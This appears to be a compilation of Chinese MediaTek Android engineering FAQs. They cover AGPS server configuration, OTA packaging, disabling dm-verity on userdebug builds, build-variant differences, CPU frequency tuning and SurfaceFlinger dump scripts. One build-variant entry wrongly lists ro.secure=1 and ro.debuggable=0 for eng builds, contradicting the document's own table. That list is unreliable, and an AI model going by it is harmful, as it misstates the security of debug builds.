## [gps]  [FAQ03537]  AGPS SUPL服务器客制化

```text
1，获取当前有效AGPS配置接口
AgpsProfileManager mProfileMgr = AgpsProfileManager.getProfileManager(context);
MtkAgpsProfile profile = mProfileMgr.getCurrentProfile()；
String name = profile.name;                      // 进行查询或者设置的依据
String slpName = profile.slpName;          // 在AGPS设置中的UI显示
String backupsName = profile.backupSlpNameVar;  // 只是个备份名字，暂无其他作用
String addr = profile.addr;                          // SUPL IP地址
int port = profile.port;                        // SUPL 端口
int tls = profile.tls;                      // 是否要安全认证，0不需要，1需要
int showType = profile.showType; 
// 显示类型，0表示总是显示，1表示工厂模式下显示，2根据运营商码显示

2，获取系统内其他AGPS配置接口
MtkAgpsProfile profile = mProfileMgr.getProfile("name");
// name 在实际使用中只能用已经成功在数据库中保存的profile code 进行代替(如GOOGLE，NOKIA或者自己配置成功的)。

3，设置当前有效AGPS接口
mProfileMgr.setCurrentProfile（"GOOGLE"）；
// GOOGLE 可以用NOKIA或者自己修改后的profile code 代替。
mProfileMgr.switchAgpsProfile()； // 这个函数调用后才可以使得刚才设置项立即生效。

4，修改系统内的AGPS配置接口
// updateItem(String profile_name, String item_name, String value)
mProfileMgr.updateItem(mProfileMgr.getCurrentProfileCode(), //当前有效AGPS服务器
    mProfileMgr.PROFILE_PORT, "7275");
// 这种更改的方法profile_name可以是所有已经写入到系统的profile.name，
// item_name只能是mProfileMgr.PROFILE_NAME/mProfileMgr.PROFILE_ADDRESS/
// mProfileMgr.PROFILE_PORT/mProfileMgr.PROFILE_TLS中的一个

5，新增一个有效Agps服务器接口
ContentValues values = new ContentValues();
values.put(AgpsProfileColumns.PROFILE_CODE, "NewServer");
values.put(AgpsProfileColumns.PROFILE_IP_ADDRESS, "173.173.173.173");
values.put(AgpsProfileColumns.PROFILE_SLP_NAME, "NewServerName");
values.put(AgpsProfileColumns.PROFILE_BACKUP_SLP_NAME_VAR, "NewServerNameBackup");
values.put(AgpsProfileColumns.PROFILE_PORT, "7275");
values.put(AgpsProfileColumns.PROFILE_TTL, "1");
values.put(AgpsProfileColumns.PROFILE_SHOW_TYPE, "0");
profile_manager.insertOrUpdateProfile(profileCode, values);

6，为了达到恢复出厂设置，可以采用以下接口实现：
AgpsProfileManager mProfileMgr = AgpsProfileManager.getProfileManager(context);
mProfileMgr.resetAllProfile();
```

## [gps]  [FAQ17726]  如何打开和关闭GMO

```text
根据ReleaseNote_for_MT6735M_L1.MP3中的Project_Package_Set_M6735M查看版本是否支持GMO(AP Project(sub)这一列，是否有带G的project，G代表GMO)
DCC上下载文档 《Feature_Option_Info_Table_6.0.xls》查看MTK_GMO相关的宏定义
修改这几个宏定义为no(支持GMO的project默认为yes)
[FAQ15139] 如何确认项目是否打开GMO feature(LCA)?
```

## [性能]  [FAQ14105]  L版本打开WITH_DEXPREOPT宏后首次开机仍慢

```text
参照 "[FAQ13573] L版本首次开机慢" 打开宏WITH_DEXPREOPT:=true后，首次开机无效果仍然慢；
说明开机之后又去提取预置apk的odex文件(原本应该是在预编译阶段就生成的)；
主要原因是预置apk的Android.mk对32bit和64bit的配置不准确导致。

[SOLUTION] 
搜索main log关键字：dex2oat : /system/bin/dex2oat 
▪这条log打印出就代表这个apk有在做dex2oat且是32还是64的指令集

I dex2oat : /system/bin/dex2oat --zip-fd=11 --zip-location=/system/app/***.apk --oat-fd=12 --oat-location=/data/dalvik-cache/arm or arm64/system@app@**@**.apk@classes.dex --instruction-set=arm or arm64 --instruction-set-features=default --runtime-arg -Xms64m --runtime-arg -Xmx512m --swap-fd=13

▪oat-location表示odex文件存储位置
▪Instruction-set表示此apk的primaryCpuAbi对应的指令集(arm对应32bit / arm64对应64bit)


请严格遵守：
1、对于64bit的芯片,若apk只32bit的lib或者只能作为32bit运行，请在预置apk时在android.mk中添加下边的TAG标记此apk为32bit：
LOCAL_MULTILIB :=32 
(比如出现上述做dex2oat arm的log,则需这样设定)

2、而对于有源码无lib库的apk,请注释掉LOCAL_MULTILIB :=32 
(比如出现上述做dex2oat arm64的log,则需这样注释掉)

3、开机之后既提取arm又提取arm64的apk,请设定LOCAL_MULTILIB :=both
(比如出现上述做dex2oat arm以及arm64的log,则需这样设定)

总之，对32bit 和 64bit 的apk做不同处理。

[FAQ13573] L版本首次开机慢
[FAQ14102] L版本开机提示“Android正在升级或启动”
[FAQ13232] L预置apk
[FAQ13697] L版本如何将第三方so库打包到apk
```

## [FAQ18076]  android 6.0 M userdebug版本执行adb remount失败

```text
userdebug版本如果需要remount system分区来push文件debug，不需要重新编译版本disable dm-verity，只需要执行以下adb命令即可。
adb root
adb disable-verity
adb reboot

重新启动后再执行:
adb root
adb remount即可把system分区remount成rw。

贵司向system分区push文件后，请不要再adb enable-verity，否则就会无法开机，因此push文件后，system分区数据就发生了变化。

adb disable-verity/enable-verity 命令只能在userdebug模式下使用。user版本不支持关闭dm-verity。
如果您的adb不支持adb disable-verity命令，请更新android sdk platform-tools到最新版本。或直接到以下的link下载最新版的独立adb tool。
http://forum.xda-developers.com/showthread.php?t=2317790

其他相关信息请参考https://source.android.com/security/verifiedboot/index.html
```

## [FAQ18367]  [OTA]  [Recovery]  [Common] Android M 升级出错：Error:Invalid OTA package,missing scatter Installation aborted

```text
Android M 编译差分包的命令有所修改，继续采用L版本的差分包命令会导致错误：Error:Invalid OTA package,missing scatter Installation aborted.

参考文档OTA and Android SD upgrade application note.docx 3.3.4节
M版本编译升级包的命令，注意命令中的-s参数。

./build/tools/releasetools/ota_from_target_files  -s ./device/mediatek/build/releasetools/mt_ota_from_target_files  --block -k <key_path> -i V2_org.zip V4_new.zip   V2_4.zip

注意：
一定要带上-s ./device/mediatek/build/releasetools/mt_ota_from_target_files 

[FAQ18250]  [recovery]  [common] Android M upgrade occurs “Error: Invalid OTA package, missing scatter”
```

## [知识点]  [FAQ02499]  Android USER 版本与ENG 版本差异

```text
Android USER 版本与ENG 版本的差异, 用户版本与工程版本的差异

[Keyword] 
USER ENG user eng 用户版本 工程版本 差异

[Solution] 
Google 官方描述: USER/USERDEBUG/ENG 版本的差异, 参考alps/build/core/build-system.html 的详细说明
eng This is the default flavor. A plain make is the same as make eng.
*       Installs modules tagged with: eng, debug, user, and/or development.
*       Installs non-APK modules that have no tags specified.
*       Installs APKs according to the product definition files, in addition to tagged APKs.
*       ro.secure=0
*       ro.debuggable=1
*       ro.kernel.android.checkjni=1
*       adb is enabled by default.
*       Setupwizard is optional
user make user
This is the flavor intended to be the final release bits.
*       Installs modules tagged with user.
*       Installs non-APK modules that have no tags specified.
*       Installs APKs according to the product definition files; tags are ignored for APK modules.
*       ro.secure=1
*       ro.debuggable=0
*       adb is disabled by default.
*       Enable dex pre-optimization for all TARGET projects in default to speed up device first boot-up
userdebug make userdebug
The same as user, except:
*       Also installs modules tagged with debug.
*       ro.debuggable=1
*       adb is enabled by default.
 
MTK 补充说明差异:
(1) Debug/LOG 方面，原则上user 版本只能抓到有限的资讯，eng 可以抓到更多的资讯，Debug 能力更强，推崇使用eng 版本开发测试
*       因ro.debuggable 的差异，eng 版本默认开启了app 的JDWP，以及uart console debug; 相对应的user 版本关闭, 导致在DDMS 上无法看到app process 的列表.
*       MTK System LOG 在ICS 以后，在user 版本默认关闭全部LOG， 在eng 版本中默认打开，以便抓到完整的资讯
*       在eng 版本上，LOG 量 >= user 版本的log 量，一些地方会直接check eng/user 版本来确认是否打印LOG
*       user 版本默认关闭uart, eng 版本默认开启uart
*       在eng 版本上，开启ANR 的predump, 会抓取ftrace，可以得到更多ANR的资讯
*       在eng 版本上，可用rtt 抓取backtrace，可开启kdb 进行kernel debug, 可用ftrace 抓取cpu 执行场景
*       MTK aee 在ENG 版本抓取更多的异常资讯，比如native exception 会抓取core dump 信息
*       eng 版本linux kernel 开启了大量的debug 选项，可以抓取出更多的资讯，如可以使用sysrq-trigger, KDB, User 版本则关闭
 
(2) 性能方面(Performance)，原则上进行性能测试请使用user 版本测试
*       user 版本为提高第一次开机速度，使用了DVM 的预优化，将dex 文件分解成可直接load 运行的odex 文件，eng 版本不会开启这项优化
*       user 版本相关kernel debug 关闭，有利于提高linux kernel 的性能
*       user 版本更少的LOG 打印，更少的debug 代码，以及uart 的关闭，原则上user 版本的性能要优于eng 版本
 
(3) 安全方面(security)的影响
*       eng 版本默认关闭了adb 的PC RSA指纹验证，而user 版本默认开启, 如果没有验证 PC RSA 指纹, adb 连接时将提升devices offline
*       因user/eng 版本设置ro.secure不同，导致user 版本adb 只拥有shell 权限，而eng 版本具有root 权限
*       eng 版本内置了su, adb 具有root 权限, 导致系统的安全性严重受到影响
 
(4) 如何确认user/eng 版本
*       Java 层，check android.os.Build 类中的TYPE 值
*       native 层，property_get("ro.build.type", char* value, "eng"); 然后check value 值
*       Debug 时， adb shell getprop ro.build.type 返回值如果是user 即user 版本，eng 即eng 版本
*       Log 确认,  mobile log/Aplog_xxxxx/versions 中查看ro.build.type 属性
 
(5) 如何编译user/eng 版本
*       默认编译是eng 版本，如果需要编译user 版本，请加入参数 -o=TARGET_BUILD_VARIANT=user 如:
        ./mk -o=TARGET_BUILD_VARIANT=user mt6595_phone new
```

## [知识点] Android源码编译选项eng、user、userdebug的区别

```text
1、各选项简要说明
eng：debug版本
user:release版本
userDebug版本：部分debug版本

2、详细介绍
Android源码编译选项eng、user、userdebug是由Android.mk文件中的LOCAL_MODULE_TAGS配置项来决定的。其一般形式如下：

LOCAL_MODULE_TAGS := user eng optional test
各项具体说明如下：
1、user：只有在user版本时该模块才被编译进去；
2、eng：只有在eng版本时该模块才被编译进去；
3、test：只有在tests版本时该模块才被编译进去；
4、optional：在所有版本中都编译该模块进去。

其中的值可设置为1个或多个，分别对应编译选项的同一个或多个。
eng、user、userdebug的区别如下：

1、当make eng时，也即相当于make。此时BuildType为eng，那么其编译进去的内容包括：
  ·Intended for platform-level debugging
  ·Installs modules tagged with: eng, debug, user, and/or development
  ·Installs non-APK modules that have no tags specified
  ·Installs APKs according to the product definition files, in addition to taggedAPKs
  ·Sets ro.secure=1
  ·Sets ro.debuggable=0
  ·Sets ro.kernel.android.checkjni=1
  ·adbd is enabled by default

2、当make user时，此时BuildType为user,那么其编译进去的内容包括：
  ·Intended to be the final release
  ·Installs modules tagged as user
  ·Installs non-APK modules that have no tags specified
  ·Installs APKs according to the product definition files (tags are ignored forAPK modules)
  ·Sets ro.secure=1
  ·Sets ro.debuggable=0
  ·adbd is disabled by default

3、当make userdebug时，此时BuildType为userdebug,那么其编译进去的内容包括：
   thesame as user, except:
  ·Intended for limited debugging
  ·Installs modules tagged with debug
  ·Sets ro.debuggable=1
  ·adbd is enabled by default 

3、表格：
eng
This is the default flavor. A plain "make " is the same as "make eng ". droid is an alias foreng .
·         Installs modules tagged with: eng , debug , user , and/or development .
·         Installs non-APK modules that have no tags specified.
·         Installs APKs according to the product definition files, in addition to tagged APKs.
·         ro.secure=0
·         ro.debuggable=1
·         ro.kernel.android.checkjni=1
·         adb is enabled by default.
user
"make user "
This is the flavor intended to be the final release bits.
·         Installs modules tagged with user .
·         Installs non-APK modules that have no tags specified.
·         Installs APKs according to the product definition files; tags are ignored for APK modules.
·         ro.secure=1
·         ro.debuggable=0
·         adb is disabled by default.
userdebug
"make userdebug "
The same as user , except:
·         Also installs modules tagged with debug .
·         ro.debuggable=1
·         adb is enabled by default.
```

## [FAQ17441]  [OTA]  [Recovery]  [Common] Android M 版本如何升级lk 、preloader ?

```text
Android M 版本升级lk、preloader 方法。 

[SOLUTION] 

M版本有些平台是默认升级lk和preloader，这些平台有6755,6750,6797等。
有些平台需要修改一些代码来实现。这些平台有6735,6580,6737等。
note：
修改代码等情况，可能导致平台的划分不一定准确，请一定仔细阅读下面所有的内容。

判断是否默认升级：
查看MTXXXX_Android_scatter.txt文件。搜索关键字：
is_upgradable

一.存在is_upgradable关键字
比如：
- partition_index: SYS19
partition_name: lk
file_name: lk.bin
is_download: true
type: NORMAL_ROM
linear_start_addr: 0xa900000
physical_start_addr: 0xa900000
partition_size: 0x100000
region: EMMC_USER
storage: HW_STORAGE_EMMC
boundary_check: true
is_reserved: false
operation_type: UPDATE
is_upgradable: true
empty_boot_needed: true
reserve: 0x00
 
is_upgradable的值决定是否升级对应分区，true表示升级，false表示不升级。这种情况下lk和preloader是默认升级的，不需要修改文件。但是如果修改了分区表等情况，可能会改变默认的设置，所以这一步一定要确定：preloader，lk和lk2三个分区的is_upgradable都是true，如果为false，请参考FAQ18188修改分区表OTA_Update字段。
 
二.不存在is_upgradable关键字
修改方法：
1、Full OTA update：
修改build/core/makefile
修改前：
$(hide) ./device/mediatek/build/releasetools/mt_ota_preprocess.py $(zip_root) $(PRODUCT_OUT) $(PRODUCT_OUT)/ota_update_list.txt 

修改后： 
$(hide) MTK_LOADER_UPDATE=yes MTK_PRELOADER_OTA_BACKUP=no ./device/mediatek/build/releasetools/mt_ota_preprocess.py $(zip_root) $(PRODUCT_OUT) $(PRODUCT_OUT)/ota_update_list.txt

2、Incremental OTA update：
编译差分升级包的命令加上如下蓝色部分：
./build/tools/releasetools/ota_from_target_files -s ./device/mediatek/build/releasetools/mt_ota_from_target_files  --block -k <key_path> -i V2_org.zip V4_new.zip   V2_4.zip
```

## [FAQ18251]  [Recovery]  [common]  Android M Adoptable SD卡无法在recovery mode识别和使用

```text
Android M 版本，当外置的SD卡被Adoptable 之后，即Format As internal Storage，此时，如果把升级包置于SD卡，进入recovery mode后是无法找到升级包并正常升级的。
[SOLUTION] 
首先，外置SD卡可以被Adoptable 这个功能，是Android M 引入的一个new feature，其次，在被Format As internal Storage之后，SD卡会被加密并被Format成Ext4格式，而在recovery mode 是无法访问这时的SD卡，这个是Google原生的做法，MTK维持Google的做法，所以无法在recovery mode是无法挂载Adoptable后的SD的，谢谢！

这种情况下，如果要实现OTA升级，强烈建议您把升级包放入/data/ 下面，谢谢！

相关可参考：
FAQ17442
[Recovery]  [Common] Android M 版本data加密后升级包放入/data分区如何升级?
```

## [语言]  [FAQ10991]  泰语、缅甸语等复杂语言圈圈问题

```text
一些复杂语言如泰语、缅甸语、印地语，经常会看到一些带有虚线圈圈字符。这是一种正常的处理机制。对于那些不能单独存在的字符，在显示时额外添加虚线圈，以提供对于这些字符的含义的一些提示，使得这些字符在显示时能够有增加适当的位置，避免字符的无限叠加等问题。如在Windows7上的office2010中缅甸语也有同样的行为，如下图:
大多

MTK在JB版本引入了这种机制，如果想去掉圈圈这种机制，可以按照如下方法：
泰语：
JB、JB2版本：
修改文件external\harfbzz\src\harfbuzz-thai.c
注释如下代码
about line 418
    case tR:
//    charIndex[(*outputIndex)]  = inputIndex;
//     outputBuffer[(*outputIndex)++]  = errorChar;
        charIndex[(*outputIndex)]  = inputIndex;
        outputBuffer[(*outputIndex)++]  = currChar;
        break;
about line 426
    case tS:
//        if (currChar == CH_SARA_AM) {
//            charIndex[(*outputIndex)]  = inputIndex;
//            outputBuffer[(*outputIndex)++]  = errorChar;
//        }
        charIndex[(*outputIndex)]  = inputIndex;
        outputBuffer[(*outputIndex)++]  = currChar;
        break;
JB3、JB5版本由于变形引擎不同，默认是不带圈圈的，如果想使用这种机制，可以修改：
frameworks/base/core/jni/android/graphics/TextLayoutCache.cp
about line 820
switch (script) {
    case HB_SCRIPT_MYANMAR:
        return &GraphiteLayoutShaper::getInstance();
    case HB_SCRIPT_BENGALI:
    case HB_SCRIPT_THAI:  ////新增此句
     harfbuzzShaper.setShapingScript(getHBScriptFromHBNgScript(script));
        return &harfbuzzShaper;
缅甸语：
在KK,L,M版本上修改文件
 民间缅甸语  修改harfbuzz_ng\src\hb-old\harfbuzz-zawgyi.c文件，将该文件中
        //  reordered[len]  = Mymr_C_DOTTED_CIRCLE;
        //   len += 1;
        屏蔽一共2处
 官方缅甸语 修改 harfbuzz_ng\src\hb-old\harfbuzz-myanmar.c文件，将该文件中
        //       reordered[len]  = C_DOTTED_CIRCLE;
        //       ++len;
        屏蔽一共1处。
在JB版本上：
对于官方缅甸语JB3、JB5版本由于变形引擎不同，默认是不带圈圈的，如果想使用这种机制，可以修改：frameworks/base/core/jni/android/graphics/TextLayoutCache.cp
about line 820
switch (script) {
    case HB_SCRIPT_MYANMAR:
       //#ifndef ZAWGYI_SUPPORT
       // return &GraphiteLayoutShaper::getInstance();
           // #endif
           //注释上述红色代码

需要注意的是，去掉圈圈机制可以会导致一些字符变形问题，如连续输入上下标、母音等字符，后面的字将不断往前面的字上面叠。同时由于该solution没能做严格的测试，而有可能存在其他潜在的风险。在不能单独存在的字符单独出现时去除虚线圈的做法，并不合理，并可能存在其他问题。如果要去掉，需要评估风险。

缅甸语比较特殊，有官方(Paduak)和民间(Zawgyi)之分，二者不同的是编码机制不同，因此这2种缅甸语的字串翻译、处理引擎、字库都是不同的。如果遇到问题可以先按照如下方法排查：
1、 如果字串中出现一个圈圈可能是个别字串翻译问题，可以参考FAQ09106解决。
2、 如果浏览网页或者界面中出现大量圈圈、这可能是网页内容或者翻译和字库不匹配导致。如大多缅甸语网站是民间缅甸语的，如果使用官方的缅甸语引擎和字库访问的话，就会出现这个问题。
3、目前MTK仅仅在JB3及以后的版本可以支持民间缅甸语，但是需要申请patch(L和M上不必申请patch)，具体patch可以查看FAQ03761备注。

[FAQ09106]  如何去掉界面中缅甸语圈圈(JB,JB2)
```

## [debug]  [log]  [FAQ18513]  M版本如何关闭或打开log

```text
關閉所有log
简单的说你可以执行如下两步:
關閉所有log
adb shell xlog filter-set off
然後
adb shell logcat -c

下面是具体的：
adb shell xlog filter-set off

開啟所有log
adb shell xlog filter-set on

開啟verbose等級以下的log
adb shell xlog filter-set verbose

開啟debug等級以下的log
adb shell xlog filter-set debug

開啟info等級以下的log
adb shell xlog filter-set info

開啟warn等級以下的log
adb shell xlog filter-set warn

開啟error 等級以下的log
adb shell xlog filter-set error
```

## [性能]  [FAQ17683]  如何调整CPU corenum, freq, policy

```text
cpufreq控制结点位于 /sys/devices/system/cpu/cpu0/cpufreq/
C:\Users\mtk71247>adb shell
root@NOBLEX:/ # cd sys/devices/system/cpu/cpu0/cpufreq
cd sys/devices/system/cpu/cpu0/cpufreq
root@NOBLEX:/sys/devices/system/cpu/cpu0/cpufreq # ls
ls
cpuinfo_cur_freq： 当前cpu正在运行的工作频率
cpuinfo_max_freq：该文件指定了处理器能够运行的最高工作频率 （单位: 千赫兹）
cpuinfo_min_freq ：该文件指定了处理器能够运行的最低工作频率 （单位: 千赫兹）
cpuinfo_transition_latency：该文件定义了处理器在两个不同频率之间切换时所需要的时间  （单位： 纳秒）
scaling_available_frequencies：所有支持的主频率列表  （单位: 千赫兹）
scaling_available_governors：该文件显示当前内核中支持的所有cpufreq governor类型
scaling_cur_freq：被governor和cpufreq核决定的当前CPU工作频率。该频率是内核认为该CPU当前运行的主频率
scaling_driver：该文件显示该CPU正在使用何种cpufreq driver
scaling_governor：通过echo命令，能够改变当前处理器的governor类型
scaling_max_freq：显示当前policy的上下限  （单位: 千赫兹）需要注意的是，当改变cpu policy时，需要首先设置scaling_max_freq, 然后才是scaling_min_freq
scaling_setspeed：如果用户选择了“userspace” governor, 那么可以设置cpu工作主频率到某一个指定值。

                             只需要这个值在scaling_min_freq 和 scaling_max_freq之间即可。
root@NOBLEX:/sys/devices/system/cpu/cpu0/cpufreq #

1、查看当前CPU支持的频率档位
root@NOBLEX:/sys # cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_available_frequencies
sys/devices/system/cpu/cpu0/cpufreq/scaling_available_frequencies              
1300000 1235000 1170000 1040000 819000 598000 442000 299000
root@NOBLEX:/sys #
2、查看当前支持的governor（手机型号可能略有不同）     
root@NOBLEX:/sys # cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_available_governors
sys/devices/system/cpu/cpu0/cpufreq/scaling_available_governors                
ondemand userspace powersave interactive performance
performance表示不降频，
ondemand表示使用内核提供的功能，可以动态调节频率，
powersvae表示省电模式，通常是在最低频率下运行，
userspace表示用户模式，在此模式下允许其他用户程序调节CPU频率。

root@NOBLEX:/sys # 
3、查看当前选择的governor
cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor
interactive
root@NOBLEX:/sys #

4、查看系统支持多少核数
root@NOBLEX:/ # cat sys/devices/system/cpu/present
cat sys/devices/system/cpu/present
0-3
root@NOBLEX:/ # 

5、全开所有cpu ，在实际设置时，还需要（有root权限才可以设置）

adb shell "echo 0 > /proc/hps/enabled" (关闭cpu hotplug)
adb shell "echo performance > /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor" (固定最高频)
echo 1 > /sys/devices/system/cpu/cpuX/online
X表示(0~3，不同平台CPU core 数是不一样的)
例：6735平台
root@NOBLEX:/ # echo 1 >sys/devices/system/cpu/cpu1/online
echo 1 >sys/devices/system/cpu/cpu1/online
root@NOBLEX:/ # echo 1 >sys/devices/system/cpu/cpu2/online
echo 1 >sys/devices/system/cpu/cpu2/online
root@NOBLEX:/ # echo 1 >sys/devices/system/cpu/cpu3/online
echo 1 >sys/devices/system/cpu/cpu3/online

6、设置频率(可以先cat 出来当前的频率有哪些)
C:\Users\mtk71247>adb shell "cat /proc/cpufreq/cpufreq_ptpod_freq_volt"
[0]  = { .cpufreq_khz = 1300000, .cpufreq_volt = 113750, .cpufreq_volt_org = 1250
00, },
[1]  = { .cpufreq_khz = 1235000, .cpufreq_volt = 110000, .cpufreq_volt_org = 1231
25, },
[2]  = { .cpufreq_khz = 1170000, .cpufreq_volt = 106250, .cpufreq_volt_org = 1206
25, },
[3]  = { .cpufreq_khz = 1040000, .cpufreq_volt = 98750,  .cpufreq_volt_org = 1150
00, },
[4]  = { .cpufreq_khz = 819000,  .cpufreq_volt = 95000,  .cpufreq_volt_org = 1100
00, },
[5]  = { .cpufreq_khz = 598000,  .cpufreq_volt = 95000,  .cpufreq_volt_org = 1050
00, },
[6]  = { .cpufreq_khz = 442000,  .cpufreq_volt = 95000,  .cpufreq_volt_org = 1000
00, },
[7]  = { .cpufreq_khz = 299000,  .cpufreq_volt = 95000,  .cpufreq_volt_org = 9500
0, },

adb shell "echo 0 >proc/cpufreq/cpufreq_oppidx"

设置后再cat 看一下当前的设置是否成功
adb shell "cat proc/cpufreq/cpufreq_oppidx"
[MT_CPU_DVFS_LITTLE/0] 
cpufreq_oppidx = 0
        OP(1300000, 113750),
        OP(1235000, 110000),
        OP(1170000, 106250),
        OP(1040000, 98750),
        OP(819000, 95000),
        OP(598000, 95000),
        OP(442000, 95000),
        OP(299000, 95000),

C:\Users\mtk71247>
    
7、查看当前状态有多少个CPU
adb shell cat sys/devices/system/cpu/online
0-3
```

## [性能]  [FAQ13573]  L版本首次开机慢

```text
首次开机慢的原因：
一 L版本默认开启了加密功能，影响开机时间。
    请参考FAQ关闭加密功能。
    [FAQ14128] L版本如何关闭默认加密

二 L 版本首次开机会提取所有预置apk的odex文件，花费比较多时间。
    请参考FAQ修改为预编译时提取apk的odex文件。
    [FAQ14131]  L版本预编译提取apk的odex文件，如何修改?
    [FAQ14105]  L版本打开WITH_DEXPREOPT宏后首次开机仍慢

三 如果开机之后，发现单个APP优化的时候还比较长，请参考FAQ：
    [FAQ14117] 单个APP优化时间过长的问题 

四 如果开机时间还不理想，建议关闭patch oat功能，请参考FAQ：
    [FAQ14132]  开启WITH_PREODEX之后，如何减少第一次开机之后data分区的大小 

五 如果遇到eng版本make命令生成不了odex文件，请参考FAQ:
    [FAQ15081]  eng版本make命令生成不了odex的说明

实际测试情况：
使用手机：mt6752 L user版本
测试情况：
1 关闭WITH_DEXPREOPT且开启手机加密
首次开机时间：4:40
2        开启WITH_DEXPREOPT且关闭手机加密
首次开机时间：2:16
上述首次开机时间是mtk内部52手机测试时间，仅供参考。
首次开机时间和贵司具体预置的apk的数量有关。
请知悉，谢谢~
注意：
1 请不要预置太多apk，尽量减少不必要的apk，太多apk 会导致开机慢。
相关FAQ：
[FAQ14102] L版本开机提示“Android正在升级或启动”
[FAQ13232] L 预置apk
[FAQ13697] L 版本如何将第三方so库打包到apk
```

## [debug]  [FAQ05755]  如何定位花屏和界面错乱等绘制异常的问题?

```text
在如下3个大的check步骤中，请分别按照每一步的操作来进行排查；如果贵司有定位到某一个问题点，请在提eService时，将问题排查过程写清楚，并提供相应的资料到eService附件中，以便MTK做进一步分析。

1.通过DDMS或GAT tool获取异常界面的屏幕截图

[Android 5.0版本之前] DDMS 截图方法如下：Device --> Screen capture，点击Screen capture，就能抓到当前刷到LCM 屏上的那帧数据,或者通过Eclipse中的DDMS工具的screen capture功能，点击操作面板上的“照相机”图标即可。

=>如果屏幕截图是ok的，那么问题点就在LCM driver或timing，具体问题要具体分析。

=>如果屏幕截图not ok，那么你需要进入第2步去获取并查看FrameBuffer中的数据。

[Android 5.0版本及以后] 

Android L版本上抓取到的DDMS截图，不是ovl output，而是GPU composer之后的画面。

若要抓取ovl output，可以输入如下命令

adb shell

system/bin/lcdc_screen_cap  /data/fb.bin

2.获取FrameBuffer中的数据

对于android 4.1及以后的版本，通过如下方法抓取FrameBuffer中的数据：

先做如下操作，再dump framebuffer数据

先进入手机中Settings->Developer options->Disable HW overlays

再勾选Disable HW overlays

抓取framebuffer 数据：
adb shell
cat /dev/graphics/fb0  > /data/fb.bin
然后将fb.bin adb push出来，通过工具查看fb.bin

=>如果此步骤的屏幕截图是ok，那说明是LCM controller做overlay时出了问题。

需要把寄存器值打出来(保存在kernel log中)，再抓kernel log做进一步分析

打印寄存器的值：

请在当前刷屏时，将LCM controller寄存器打印出来，寄存器打印命令如下：

adb shell

echo reg:lcd>sys/kernel/debug/mtkfb

这条命令会将LCM controller的寄存器打印到kernel log中

抓kernel log的方式：要么开启mobile log，要么单独用adb命令抓取kernel log；

用adb命令抓取kernel log的方法是：adb shell cat /proc/kmsg > kernel_log.txt

如果分析问题原因是出在这一步，遇到困难时，请将抓取的资料都提供到eService附件中。

=>如果此步骤的屏幕截图not ok，那么就需要进入第3步，抓取layerdump。

 
3、抓取layerdump

在异常界面下，手机连接usb，执行抓取layerdump，抓取的方法根据android的版本不同而不同，下面会分别列出不同版本的抓取方法：

android 4.0~4.4的版本，分别介绍在windows环境下和linux 环境下如何抓取layerdump

在Windows系统环境下，将如下内容copy到新建文本文件中，然后保存文件为SF_layerdump_all.bat 

保持手机连接usb并且在异常界面下，在电脑端双击鼠标执行该脚本(请在Windows系统下执行)，就会在脚本所在路径下生成一个文件SF_layerdump_all

将SF_layerdump_all和复现问题的mobile log一并提供到eService附件中。

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

SET raw=%1
SET layerdump=%2

IF "%raw%"=="" SET raw=0
IF "%layerdump%"=="" SET layerdump=-1

adb shell setprop debug.sf.layerdump.raw %raw%
adb shell setprop debug.sf.layerdump %layerdump%
adb shell dumpsys SurfaceFlinger > SF_layerdump_all.log
adb shell mkdir /data/SF_dump
adb shell mv /data/*.png /data/SF_dump
adb shell mv /data/*.i420 /data/SF_dump
adb shell mv /data/*.yv12 /data/SF_dump
adb shell mv /data/*.RGBA /data/SF_dump
adb shell mv /data/*.RGB565 /data/SF_dump
rmdir /S /Q SF_layerdump_all
md SF_layerdump_all
move SF_layerdump_all.log  SF_layerdump_all
adb pull /data/SF_dump SF_layerdump_all/
adb shell rm /data/SF_dump/*

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

注意：如果异常画面是动态的，不是那种静止不动的画面，那么可以尝试多执行几次layerdump，尽量争取能抓到发生问题时的画面的layerdump

如果不方便在Windows系统下抓取layerdump，那么就在linux系统的Terminal 下，按照如下步骤执行下面的指令:

在复现问题前，下如下这条命令，做设置并打开layerdump的开关：

adb shell setprop debug.sf.layerdump.raw 1

adb shell setprop debug.sf.layerdump -1

在即将开始复现问题前，先将下面的指令准备好，在复现问题的画面，敲回车执行这条命令，就是做layerdump的动作，

如果复现问题的画面是动态的，请多下几次这条命令，尽量把复现问题的画面dump下来

adb shell dumpsys SurfaceFlinger >SF_layerdump_all.log

执行了上面的第3条命令之后，会在手机的/data/SF_dump目录下生成一些xxx.png或*.i420,*.yv12,*.RGBA,*.RGB565等文件，请把data/SF_dump这个目录pull出来提供给我们，还有SF_layerdump_all.log文件也一并需要提供。

android 5.0及以后的版本，在windows环境下如何抓取layerdump

在Windows系统环境下

若异常画面是静态稳定的，将如下内容copy到新建文本文件中，然后保存文件为SF_bqdump_L.bat

@echo off

adb shell rm /data/SF_dump/*
adb shell setprop debug.bq.dump "@surface"

adb shell "dumpsys SurfaceFlinger" > SF_bqdump_all.log

adb shell setprop debug.bq.dump ""

rmdir /S /Q SF_bqdump_all
md SF_bqdump_all
move SF_bqdump_all.log SF_bqdump_all
adb pull /data/SF_dump SF_bqdump_all/
adb shell rm /data/SF_dump/*

echo "Please view dump files in folder 'SF_bqdump_all'"
pause

若异常画面是一闪而过的，则需用如下脚本dump画面刷新过程的几十帧画面，下面是设置30帧：SF_cont_bqdump_L_30.bat

复现问题后，双击执行下面的脚本，接着按命令行提示“按电脑任意键继续”，然后等几秒钟，系统会自动dump复现过程的所有帧到指定目录

@echo off

adb shell rm /data/SF_dump/*

:: Modified this line to set surface count,default is 30
adb shell setprop debug.bq.dump "@surface#30"

adb shell "dumpsys SurfaceFlinger > /dev/null"

pause

adb shell setprop debug.bq.dump "@surface"

adb shell "dumpsys SurfaceFlinger" > SF_bqdump_all.log

adb shell setprop debug.bq.dump ""

rmdir /S /Q SF_bqdump_all
md SF_bqdump_all
move SF_bqdump_all.log SF_bqdump_all
adb pull /data/SF_dump SF_bqdump_all/
adb shell rm /data/SF_dump/*

echo "Please view dump files in folder 'SF_bqdump_all'"
pause

